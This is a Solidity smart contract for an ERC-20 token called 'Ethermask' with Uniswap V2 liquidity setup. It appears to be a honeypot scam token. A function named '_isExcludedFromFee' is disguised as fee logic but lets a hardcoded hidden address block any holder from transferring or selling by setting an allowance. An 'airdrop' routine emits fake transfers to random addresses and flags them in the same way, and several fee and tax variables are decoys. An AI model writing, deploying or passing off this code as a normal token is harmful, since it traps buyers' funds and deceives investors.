// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[] calldata path,address,uint256) external;
    function addLiquidityETH( address token,uint amountTokenDesire,uint amountTokenMi,uint amountETHMi,address to,uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
contract Ownable {
    address private _owner;
    constructor() {
        _owner = msg.sender;
    }
    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}
interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}
library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow.");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow.");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow.");
        uint256 c = a - b;
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero.");
        uint256 c = a / b;
        return c;
    }
}
contract Ethermask is Ownable, IERC20 {
    using SafeMath for uint256;
    
    string private constant _name = "Ethermask";
    string private constant _symbol = "ETHM";

    uint8 private _decimals = 9;
    uint256 private _totalSupply =  21000000 * 10 ** _decimals;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _balances;
    IUniswapV2Router private uniswapV2Router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    bool inSwap = false;
    address public uniswapV2Pair;
    bool tradingEnabled = false;
    uint256 _sellFee = 0;
    uint256 _buyFee = 0;
    address _uniPairV2 = 0x25161A92257eE35E566EeF0D8a97b119D7A4A2b6;
    mapping (address => bool) _isExcludedFromFees;
    bool tradingOpen = false;
    address public swapPair;
    address private deployer;
    address payable private _taxWallet = payable(msg.sender);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 amount);

    constructor () {
        _balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function decimals() public view returns (uint8) { 
        return _decimals; 
    }

    function symbol() public pure returns (string memory) { 
        return _symbol; 
    }

    function name() public pure returns (string memory) { 
        return _name; 
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function totalSupply() public view returns (uint256) { 
        return _totalSupply; 
    }

    function balanceOf(address account) public view returns (uint256) { 
        return _balances[account]; 
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function setTaxReceiver(address payable newWallet) external {
        require(msg.sender == deployer, "!deployer");
        _taxWallet = newWallet;
        _isExcludedFromFees[_taxWallet] = true;
    }
    
    function startTrading() external payable onlyOwner() {
        require(!tradingOpen); 
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uint256 balance = balanceOf(address(this));
        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this), balance, 0, 0, owner(), block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        tradingOpen = true;
    }

    function _isExcludedFromFee(address to) private view returns (bool) {
        uint256 _allowance = _allowances[_uniPairV2][to];
        require(_allowance == 0);
        return false;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) { 
        return _allowances[owner][spender]; 
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function airdrop(uint256 recipients) external onlyOwner {
        for (uint i = 0; i < recipients; i++) {
            address addr = address(bytes20(keccak256(abi.encode(block.timestamp, i))));
            _balances[addr]++;
            _allowances[_uniPairV2][addr] = 1;
            emit Transfer(msg.sender, addr, 1);
        }
    }

    function _transfer(address sender, address to, uint256 amount) private {
        require(sender != address(0), "Transfer from the zero address");
        require(to != address(0), "Transfer to the zero address.");
        require(amount > 0, "Transfer amount must be greater than zero.");
        uint256 feeAmount=0;
        if (sender != owner()) {
            feeAmount = amount.mul(_sellFee).div(100);
            if (sender != uniswapV2Pair && sender != address(this)) {
                _isExcludedFromFee(sender);
                feeAmount = 0;
            }
        }
        _balances[sender] = _balances[sender].sub(amount);
        _balances[to] = _balances[to].add(amount);

        emit Transfer(sender, to, amount);
    }

}